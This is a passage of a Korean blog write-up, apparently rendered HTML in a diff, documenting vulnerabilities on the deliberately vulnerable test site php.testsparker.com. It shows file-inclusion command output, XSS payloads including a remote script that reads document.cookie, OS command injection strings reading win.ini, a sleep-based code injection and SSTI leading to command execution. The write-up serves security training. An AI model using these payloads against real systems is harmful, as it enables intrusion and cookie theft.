+<span class="n">res</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>입력한 명령어가 실행되어 실제 서버의 내부 IP를 반환하고있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows IP Configuration
+
+Ethernet adapter Local Area Connection:
+   Connection-specific DNS Suffix  . : ec2.internal
+   IPv4 Address. . . . . . . . . . . : 172.30.0.251
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.30.0.1
+
+Tunnel adapter isatap.ec2.internal:
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : ec2.internal
+
+Tunnel adapter Local Area Connection* 9:
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+</code></pre></div></div>
+
+<p>참조: https://book.hacktricks.xyz/pentesting-web/file-inclusion#input</p>
+
+<h2 id="xss">XSS</h2>
+<h3 id="xss-1">XSS-1</h3>
+<p>외부 JS 파일을 include하는 페이지가 존재함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/products.php?pro=url
+</code></pre></div></div>
+<p>외부스크립트 주소를 전달하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pro=http://xss.rocks/xss.js
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205547024-87ee7e05-826b-4d42-9e7a-1195c65b033a.png" alt="image" /></p>
+
+<p>외부 스크립트가 페이지 내에 삽입되어 스크립트 실행
+<img src="https://user-images.githubusercontent.com/56434196/205547152-6d4b49ab-7880-4b0d-a068-69ec32f3dfde.png" alt="image" /></p>
+
+<p>xss.js 파일 내용은 아래와 같음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+</code></pre></div></div>
+
+<h3 id="xss-2">XSS-2</h3>
+<p>로그인 이후 아래 검색페이지에 접속하면 사용자의 입력값을 고대로 반환해준다</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/auth/xss.php?search=test
+</code></pre></div></div>
+<p>아래 스크립트를 전송하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?search=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+
+<p>스크립트가 실행됨
+<img src="https://user-images.githubusercontent.com/56434196/205549233-4c621fc6-b29e-47e9-916c-7b6e9a555388.png" alt="image" /></p>
+
+<h3 id="xss-3">XSS-3</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/artist.php?id=test
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205216671-e7e77d48-fd9f-40fe-92bc-93d5f5387045.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205216795-162ae03a-5e8c-46e7-9054-b1189cf50700.png" alt="image" /></p>
+
+<h3 id="xss-4">XSS-4</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testinvicti.com/About.aspx?hello=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<h3 id="xss-5">XSS-5</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/hello.php?hpp=&lt;script&gt;alert(1)&amp;pp=&lt;/script&gt;
+</code></pre></div></div>
+<h3 id="xss-6">XSS-6</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/products.php?pro="&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+
+<h2 id="directory-indexing">Directory Indexing</h2>
+<p>임의로 ‘test’ 입력했을 때, 디렉토리 인덱싱을 발견</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/test/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205217973-6612e39c-7294-4edb-a034-ae3632e7032d.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/56434196/205547931-a5fb06f4-b726-4d3a-a4d9-652a4864d066.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207769745-be6e68c3-b127-48fe-8ebc-b9daa3028200.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207769821-bbf7ba18-84f3-44da-a2d2-344fbb8d89f6.png" alt="image" /></p>
+
+<h2 id="os-command-execution">OS Command Execution</h2>
+<p>nslookup 서비스를 지원하는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/nslookup.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207524104-8fe85680-b5f5-49b9-a91f-25a38c8b1946.png" alt="image" /></p>
+
+<p>사용자가 입력한 IP에 대한 도메인 정보를 출력해주는 것이 정상 프로세스이나 공격자는 별도의 명령어를 추가로 실행할 수 있다
+<br />
+<strong><em>&amp;&amp;</em></strong> : 파이프라인
+<br />
+<strong><em>%SystemRoot%</em></strong> : C:\Windows</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' &amp;&amp; type %SystemRoot%\\win.ini &amp;&amp; '
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207524759-196540a8-38c4-4288-8698-67fcc27b0a18.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; ping -n 16 localhost &amp;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207525597-1a39fa1e-7c83-4ca3-bed3-949d0c87cd6a.png" alt="image" /></p>
+
+<h2 id="etc">ETC</h2>
+<h3 id="code-injection">Code Injection</h3>
+<p>자동점검 결과 특정 함수가 처리되는 페이지를 찾았고</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/hello.php?name=
+</code></pre></div></div>
+<p>아래 값을 삽입하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?name=';sleep(5);#
+</code></pre></div></div>
+<p>슬립함수 5초를 지정한대로 응답시간이 늦춰진것을 볼수있다
+<img src="https://user-images.githubusercontent.com/56434196/207522805-25d67349-22d1-47df-8920-2a564e150e51.png" alt="image" /></p>
+
+<h3 id="server-side-template-injection">Server Side Template Injection</h3>
+<p>서버 내 ‘템플릿’ 페이지가 존재함 (자동점검 툴을 통해 식별)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/artist.php?id=
+</code></pre></div></div>
+<p>아래 값을 전달하면<br />
+<img src="https://user-images.githubusercontent.com/100695923/207839810-b6cce6d9-9f98-41c8-b731-447c47534712.png" alt="image" /></p>
+
+<p>응답페이지에서 연산이 수행된 결과를 반환하고 있다
+<img src="https://user-images.githubusercontent.com/56434196/207749118-a46e82c0-d2ab-47a6-9d3f-59a984961b29.png" alt="image" /></p>
+
+<p>이는, 사용자의 입력이 서버 측에서 템플릿 ‘랜더링’ 된다는 뜻이다, 연산이 실행되었으니 어쩌면 코드실행도??
+<img src="https://user-images.githubusercontent.com/100695923/207839270-fefdb304-7479-4479-832b-e73cad35b489.png" alt="image" /></p>
+
+<p>서버 측에서 명령어 ‘whoami’가 실행되어 반환된 모습이다 (SSTI2RCE)
+<img src="https://user-images.githubusercontent.com/56434196/207749805-c47e56e3-c55e-4aba-8e48-6807a1a1b050.png" alt="image" /></p>
+
+<p>참고: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php</p>
+
+<p><br />
+<br />
+<br />
+Done.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#vulnwebs-writeup" class="page__taxonomy-item p-category" rel="tag">VulnWebs_Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-11-29T00:00:00+09:00">November 29, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%5B+VulnWebs+%5D+-+php.testsparker.com%20http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-php.testsparker.com%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-php.testsparker.com%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-php.testsparker.com%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/vulnwebs_writeup/VulnWebs-zero.webappsecurity.com/" class="pagination--pager" title="[ VulnWebs ] - zero.webappsecurity.com
+">Previous</a>
+    
+    
+      <a href="/vulnwebs_writeup/VulnWebs-aspnet.testsparker.com/" class="pagination--pager" title="[ VulnWebs ] - aspnet.testsparker.com
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-x.x.137.97/" rel="permalink">[ VulnWebs ] - x.x.137.97
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">RECON
+
+OS: CentOS
+WAS: Apache/2.4.6
+Lang: PHP/7.2.34
+
+File Upload
+업로드 페이지가 존재하며
+http://x.x.137.97/upload.php
+
+
+
+확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도
+import reque...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" rel="permalink">[ VulnWebs ] - testhtml5.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+WAS: Nginx/1.19.0
+
+
+XSS
+
+로그인 페이지에서
+http://testhtml5.vulnweb.com/#/popular
+
+스크립트 구문으로 로그인 하면
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+
+...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/" rel="permalink">[ VulnWebs ] - testaspnet.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET
+
+
+
+
+Information Leakage
+서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음
+http://testaspnet.vulnwe...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" rel="permalink">[ VulnWebs ] - testasp.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+
+OS: Windows Server
+WAS: Microsoft-IIS/8.5
+Lang: ASP.NET
+
+Information Leakage
+임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴
+http://testasp.vulnweb.com/showfor...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 A1mH1gh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
